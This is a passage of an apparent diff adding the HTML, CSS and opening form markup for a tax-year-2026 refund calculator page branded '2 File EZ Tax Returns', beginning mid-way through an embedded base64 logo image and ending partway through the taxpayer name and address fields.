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";</script>
+<script>
+/* NodeList.forEach polyfill for older browsers */
+if (window.NodeList && !NodeList.prototype.forEach) {
+  NodeList.prototype.forEach = Array.prototype.forEach;
+}
+if (window.HTMLCollection && !HTMLCollection.prototype.forEach) {
+  HTMLCollection.prototype.forEach = Array.prototype.forEach;
+}
+</script>
+<style>
+:root{
+  --blue:#0F75BC; --blue-dk:#145589; --blue-lt:#84B9DD; --blue-pale:#C2DCEE;
+  --ink:#12202e; --muted:#5b6b7a; --line:#d8e3ec; --bg:#eef4f9; --card:#ffffff;
+  --good:#127a4e; --good-lt:#e8f6ef; --bad:#c0392b; --warn:#b8860b;
+  --box:#1d2b21; --box-txt:#8fe3b4;
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;font-size:14px}
+.wrap{max-width:1220px;margin:0 auto;padding:16px;position:relative}
+#wm{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.05;
+  background-repeat:repeat;background-size:220px auto}
+.wrap>*{position:relative;z-index:1}
+
+header{display:flex;align-items:center;justify-content:space-between;gap:16px;
+  background:var(--card);border:1px solid var(--line);border-radius:8px;padding:12px 18px;margin-bottom:14px}
+header .brand{display:flex;align-items:center;gap:14px}
+header img{height:54px;width:auto;display:block}
+header .slogan{font-size:12px;color:var(--blue);font-weight:700;letter-spacing:.9px}
+header .yr{text-align:right;font-size:12px;color:var(--muted);line-height:1.5}
+header .yr b{display:block;color:var(--blue-dk);font-size:15px}
+
+.card{background:var(--card);border:1px solid var(--line);border-radius:8px;padding:16px;margin-bottom:14px}
+.card h2{margin:0 0 12px;font-size:14px;color:var(--blue-dk);
+  border-bottom:2px solid var(--blue-pale);padding-bottom:7px;letter-spacing:.2px}
+.grid{display:grid;gap:16px;grid-template-columns:minmax(0,.92fr) minmax(0,1.08fr)}
+@media(max-width:940px){.grid{grid-template-columns:1fr}}
+
+label{display:block;font-size:11.5px;color:var(--muted);margin-bottom:4px;font-weight:500}
+input[type=text],input[type=number],input[type=email],input[type=tel],select{
+  width:100%;padding:8px 10px;border:1px solid var(--line);border-radius:5px;
+  font-size:14px;font-family:inherit;color:var(--ink);background:#fff}
+input:focus,select:focus{outline:none;border-color:var(--blue);box-shadow:0 0 0 2px rgba(15,117,188,.15)}
+input.err{border-color:var(--bad);background:#fdf3f2}
+input.ok{border-color:#9ccdb1}
+input:disabled{background:#f4f7fa;color:var(--muted)}
+.row{display:grid;gap:10px;margin-bottom:10px}
+.r3{grid-template-columns:1fr 1fr 1fr}.r2{grid-template-columns:1fr 1fr}
+.rcsz{grid-template-columns:2.2fr .7fr 1fr}
+@media(max-width:640px){.r3,.r2,.rcsz{grid-template-columns:1fr}}
+.fldmsg{font-size:10.5px;color:var(--bad);margin-top:2px}
+
+.seg{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px}
+.seg button{flex:1;min-width:92px;padding:9px 8px;border:1px solid var(--line);background:#fff;
+  border-radius:5px;cursor:pointer;font-size:13px;font-family:inherit;color:var(--muted)}
+.seg button.on{background:var(--blue);border-color:var(--blue);color:#fff;font-weight:600}
+.chk{display:flex;align-items:center;gap:9px;cursor:pointer;padding:9px 11px;
+  border:1px solid var(--line);border-radius:6px;background:#f7fbfe;margin-bottom:12px}
+.chk input{width:16px;height:16px;accent-color:var(--blue);margin:0;flex:none}
+.chk span{font-size:13px;font-weight:600;color:var(--blue-dk)}
+.chk small{display:block;font-weight:400;color:var(--muted);font-size:11.5px;margin-top:1px}
+
+#totalBox{border:1.5px solid var(--blue-lt);background:#f5fafe;border-radius:6px;
+  padding:10px 12px;margin-bottom:12px}
+#totalBox .tl{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:6px}
+#totalBox .tl label{margin:0;font-size:11px;color:var(--blue-dk);font-weight:700;letter-spacing:.4px}
+#totalBox .lockbtn{border:1px solid var(--blue);background:#fff;color:var(--blue);
+  border-radius:4px;padding:3px 9px;font-size:11px;cursor:pointer;font-family:inherit;white-space:nowrap}
+#totalBox .lockbtn.on{background:var(--blue);color:#fff}
+#totalIncome{font-size:17px;font-weight:700;font-variant-numeric:tabular-nums}
+#totalHint{font-size:10.5px;color:var(--muted);margin-top:5px;line-height:1.4}
+
+.kid{display:grid;grid-template-columns:56px 62px 1fr auto auto;gap:8px;align-items:center;margin-bottom:7px}
+.kid .lbl{font-size:12px;color:var(--muted)}
+.kid .stu{display:flex;align-items:center;gap:4px;font-size:11px;color:var(--muted);white-space:nowrap}
+.kid .stu input{width:14px;height:14px;accent-color:var(--blue)}
+.kid .x{border:none;background:none;color:var(--bad);cursor:pointer;font-size:16px;padding:0 4px;line-height:1}
+.kidhdr{display:grid;grid-template-columns:56px 62px 1fr auto auto;gap:8px;margin-bottom:5px}
+.kidhdr span{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px}
+.addk{padding:7px 14px;border:1px dashed var(--blue);background:#f2f9fe;color:var(--blue);
+  border-radius:5px;cursor:pointer;font-size:12.5px;font-family:inherit}
+.addk:disabled{opacity:.4;cursor:not-allowed;border-style:solid}
+
+.hero{background:linear-gradient(135deg,var(--blue-dk),var(--blue));color:#fff;
+  border-radius:8px;padding:20px;margin-bottom:14px}
+.hero .cap{font-size:11.5px;text-transform:uppercase;letter-spacing:1.1px;opacity:.85}
+.hero .big{font-size:clamp(30px,6vw,44px);font-weight:700;line-height:1.05;margin:6px 0 2px;
+  font-variant-numeric:tabular-nums}
+.hero .sub{font-size:12.5px;opacity:.9}
+.hero .stats{display:flex;gap:22px;flex-wrap:wrap;margin-top:14px;
+  border-top:1px solid rgba(255,255,255,.25);padding-top:12px}
+.hero .stats div{font-size:11px;text-transform:uppercase;letter-spacing:.7px;opacity:.85}
+.hero .stats b{display:block;font-size:16px;letter-spacing:0;text-transform:none;
+  margin-top:2px;font-variant-numeric:tabular-nums}
+.hero .disc{margin-top:12px;padding-top:10px;border-top:1px solid rgba(255,255,255,.22);
+  font-size:11px;opacity:.92;line-height:1.5}
+
+#costBox{background:var(--box);border-radius:8px;padding:18px 20px;margin-bottom:12px;
+  display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.15fr);gap:24px}
+@media(max-width:700px){#costBox{grid-template-columns:1fr;gap:14px}}
+#costBox .ttl{color:var(--box-txt);font-size:11.5px;font-weight:700;text-transform:uppercase;
+  letter-spacing:.8px;line-height:1.35}
+#costBox .amt{color:#ff8f80;font-size:clamp(28px,5.5vw,40px);font-weight:700;line-height:1.05;
+  margin:7px 0 5px;font-variant-numeric:tabular-nums}
+#costBox .exp{color:#c8d4cc;font-size:12px;line-height:1.5}
+#costBox .lines{align-self:center}
+.cl{display:flex;justify-content:space-between;gap:14px;padding:4.5px 0;font-size:12.5px;
+  color:#dbe5de;border-bottom:1px solid rgba(255,255,255,.09)}
+.cl span:last-child{font-variant-numeric:tabular-nums;white-space:nowrap;font-weight:600}
+.cl.g span:last-child{color:var(--box-txt)}
+.cl.r span:last-child{color:#ff8f80}
+.cl.fin{border-bottom:none;border-top:1.5px solid rgba(255,255,255,.3);margin-top:5px;
+  padding-top:8px;font-size:13.5px;font-weight:700;color:var(--box-txt)}
+.cl.fin span:last-child{color:var(--box-txt);font-size:15px}
+
+.cmp{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px}
+@media(max-width:640px){.cmp{grid-template-columns:1fr}}
+.opt{border:2px solid var(--line);border-radius:8px;padding:14px;background:#fff;
+  position:relative;cursor:pointer;transition:border-color .12s,background .12s}
+.opt:hover{border-color:var(--blue-lt)}
+.opt.sel{border-color:var(--good);background:var(--good-lt)}
+.opt .tag{position:absolute;top:-10px;left:50%;transform:translateX(-50%);background:var(--good);
+  color:#fff;font-size:10px;font-weight:700;padding:2.5px 11px;border-radius:10px;
+  letter-spacing:.4px;white-space:nowrap}
+.opt h3{margin:0 0 6px;font-size:13.5px;color:var(--blue-dk);padding-right:20px}
+.opt p{margin:0 0 9px;font-size:11.5px;color:var(--muted);line-height:1.45}
+.opt .amt{font-size:24px;font-weight:700;font-variant-numeric:tabular-nums;color:#d9705f}
+.opt .amtc{font-size:11px;color:var(--muted)}
+.opt .pick{position:absolute;top:12px;right:12px;width:16px;height:16px;border-radius:50%;
+  border:2px solid var(--line);background:#fff}
+.opt.sel .pick{border-color:var(--good);background:var(--good);box-shadow:inset 0 0 0 2.5px #fff}
+
+table{width:100%;border-collapse:collapse;font-size:13px}
+td{padding:5px 0;border-bottom:1px solid #eef2f6}
+td.n{text-align:right;font-variant-numeric:tabular-nums;white-space:nowrap;width:108px}
+tr.sec td{background:#f3f8fc;font-weight:700;color:var(--blue-dk);font-size:11.5px;
+  text-transform:uppercase;letter-spacing:.6px;padding:7px 8px;border-bottom:1px solid var(--line)}
+tr.tot td{font-weight:700;border-top:1.5px solid var(--blue-dk);border-bottom:none;padding-top:8px}
+tr.sub td:first-child{padding-left:14px;color:var(--muted)}
+tr.hdr td{font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:var(--muted);
+  border-bottom:1.5px solid var(--line);padding-bottom:5px;vertical-align:bottom;line-height:1.3}
+tr.hdr td small{display:block;text-transform:none;letter-spacing:0;font-size:9.5px;opacity:.75}
+.pos{color:var(--good);font-weight:600}
+.neg{color:var(--bad);font-weight:600}
+
+#contactBlk{background:var(--card);border:1px solid var(--line);border-radius:8px;
+  padding:18px;margin-bottom:14px;text-align:center}
+#contactBlk img{height:74px;width:auto;margin-bottom:8px}
+#contactBlk .sl{font-size:12.5px;font-weight:700;color:var(--blue);letter-spacing:1px;margin-bottom:10px}
+#contactBlk .ci{font-size:12.5px;color:var(--ink);line-height:1.85}
+#contactBlk .ci b{color:var(--blue-dk)}
+#contactBlk a{color:var(--blue);text-decoration:none}
+
+.bar{display:flex;gap:8px;flex-wrap:wrap;margin-top:4px}
+.btn{padding:9px 16px;border-radius:5px;border:1px solid var(--blue);background:var(--blue);
+  color:#fff;cursor:pointer;font-size:13px;font-family:inherit;font-weight:600}
+.btn.alt{background:#fff;color:var(--blue)}
+.btn.warn{background:#fff;color:var(--bad);border-color:#e2b6b0}
+.note{font-size:11.5px;color:var(--muted);line-height:1.5;margin-top:8px}
+.flag{background:#fdf7e6;border:1px solid #e8d9a8;border-left:3px solid var(--warn);
+  padding:9px 12px;border-radius:5px;font-size:11.5px;color:#6b5518;margin-bottom:12px;line-height:1.5}
+.errbox{background:#fdf3f2;border:1px solid #f0c8c3;border-left:3px solid var(--bad);
+  padding:9px 12px;border-radius:5px;font-size:12px;color:#8c2f22;margin-bottom:10px;display:none}
+footer{text-align:center;font-size:11px;color:var(--muted);padding:14px 0 26px;line-height:1.7}
+footer b{color:var(--blue-dk)}
+#copyright{font-size:11.5px;color:var(--blue-dk);font-weight:600;letter-spacing:.5px;margin-top:8px}
+
+#printSheet{display:none}
+#psGrid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+#psGrid .box{border:1px solid #bbb;padding:5px 7px}
+#psGrid .box h3{margin:0 0 3px;font-size:7pt;text-transform:uppercase;letter-spacing:.5px;
+  color:var(--blue-dk);border-bottom:1px solid #ddd;padding-bottom:2px}
+.psln{display:flex;justify-content:space-between;gap:8px;font-size:7.4pt;padding:.8px 0}
+.psln span:last-child{font-variant-numeric:tabular-nums;white-space:nowrap}
+
+@media print{
+  @page{size:letter portrait;margin:.36in}
+  body{background:#fff;font-size:8pt;-webkit-print-color-adjust:exact;print-color-adjust:exact}
+  .wrap{max-width:100%;padding:0}
+  #wm{display:none}
+  .grid,.card,.bar,.noprint,#contactBlk{display:none!important}
+  #printSheet{display:block!important}
+  header{border:none;border-bottom:2px solid var(--blue-dk);border-radius:0;padding:0 0 5px;margin-bottom:6px}
+  header img{height:32px}
+  header .yr b{font-size:9pt}header .yr{font-size:6.8pt}header .slogan{font-size:7pt}
+  #psHero{background:#eef5fb;border:1px solid var(--blue-lt);padding:6px 9px;margin-bottom:5px;
+    display:flex;justify-content:space-between;align-items:center;gap:12px}
+  #psHero .cap{font-size:6.8pt;text-transform:uppercase;letter-spacing:.7px;color:var(--blue-dk)}
+  #psHero .big{font-size:17pt;font-weight:700;line-height:1;font-variant-numeric:tabular-nums}
+  #psHero .r{display:flex;gap:14px;text-align:right}
+  #psHero .r div{font-size:6.2pt;text-transform:uppercase;letter-spacing:.3px;color:#456}
+  #psHero .r b{display:block;font-size:8.4pt;color:var(--ink);text-transform:none;
+    font-variant-numeric:tabular-nums;margin-top:1px}
+  #psCost{background:#1d2b21!important;color:#dbe5de;padding:6px 9px;margin-bottom:5px;
+    display:grid;grid-template-columns:1fr 1.2fr;gap:12px}
+  #psCost .ttl{color:#8fe3b4;font-size:6.4pt;font-weight:700;text-transform:uppercase;letter-spacing:.4px}
+  #psCost .amt{color:#ff8f80;font-size:14pt;font-weight:700;line-height:1.05;margin:2px 0}
+  #psCost .exp{font-size:6.2pt;color:#c8d4cc;line-height:1.3}
+  #psCost .cl{font-size:6.4pt;padding:1.4px 0;color:#dbe5de}
+  #psCost .cl.fin{font-size:7.2pt}
+  #psCmp{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-bottom:5px}
+  #psCmp .o{border:1px solid #bbb;padding:4px 7px}
+  #psCmp .o.sel{border:1.5px solid var(--good);background:#f2fbf6}
+  #psCmp .o h4{margin:0 0 2px;font-size:7pt;color:var(--blue-dk)}
+  #psCmp .o .a{font-size:10pt;font-weight:700;color:#c0503f;font-variant-numeric:tabular-nums}
+  #psCmp .o .c{font-size:6pt;color:#667}
+  #psBd{margin-top:5px}
+  #psBd table{font-size:6.9pt;width:100%;border-collapse:collapse}
+  #psBd td{padding:.8px 0;border-bottom:1px solid #f0f3f6}
+  #psBd td.n{width:74px}
+  #psBd tr.sec td{background:#eef5fb;padding:2px 5px;font-size:6.3pt}
+  #psBd tr.hdr td{font-size:5.9pt;padding-bottom:2px}
+  #psBd tr.hdr td small{font-size:5.4pt}
+  #psBd tr.tot td{padding-top:2.4px}
+  #psFlag{font-size:6.1pt;color:#6b5518;background:#fdf7e6;border-left:2px solid var(--warn);
+    padding:3px 6px;margin-top:4px;line-height:1.3}
+  footer{padding:4px 0 0;font-size:6.5pt;border-top:1px solid var(--blue-dk);margin-top:5px;line-height:1.4}
+  #printFooter{display:block!important;margin-bottom:2px}
+  #copyright{font-size:6.5pt;margin-top:3px}
+}
+#printFooter{display:none}
+</style>
+<style type="text/css" nonce="">
+.redacted {
+  color: red !important;
+}</style></head>
+<body>
+<div id="wm"></div>
+<div class="wrap">
+
+<header>
+  <div class="brand">
+    <img src="logo.png" alt="2 File EZ Tax Returns" id="lgImg" onerror="this.onerror=null;this.src=LOGO_FALLBACK">
+    <div><div class="slogan">PERSONAL RETURNS ONLY · 100% FOCUSED ON YOU</div></div>
+  </div>
+  <div class="yr"><b>2026 Tax Refund Calculator</b>Tax year 2026 · filed 2027</div>
+</header>
+
+<div class="grid">
+<div>
+
+  <div class="card">
+    <h2>Prepared for</h2>
+    <div class="errbox" id="reqErr"></div>
+    <div class="row r3">
+      <div><label>Last name *</label><input type="text" id="lastName" data-v="name" placeholder="Cohen"><div class="fldmsg"></div></div>
+      <div><label>Taxpayer first name *</label><input type="text" id="tpFirst" data-v="name" placeholder="David"><div class="fldmsg"></div></div>
+      <div><label>Spouse first name <span id="spReq">*</span></label><input type="text" id="spFirst" data-v="name" placeholder="Sarah"><div class="fldmsg"></div></div>
+    </div>
+    <div class="row"><div><label>Address *</label><input type="text" id="addr" data-v="text" placeholder="1247 Ocean Parkway, Apt 3B"><div class="fldmsg"></div></div></div>
+    <div class="row rcsz">
+      <div><label>City *</label><input type="text" id="city" data-v="text" placeholder="Brooklyn"><div class="fldmsg"></div></div>
+      <div><label>State *</label><input type="text" id="stateAbbr" data-v="state" maxlength="2" placeholder="NY"><div class="fldmsg"></div></div>
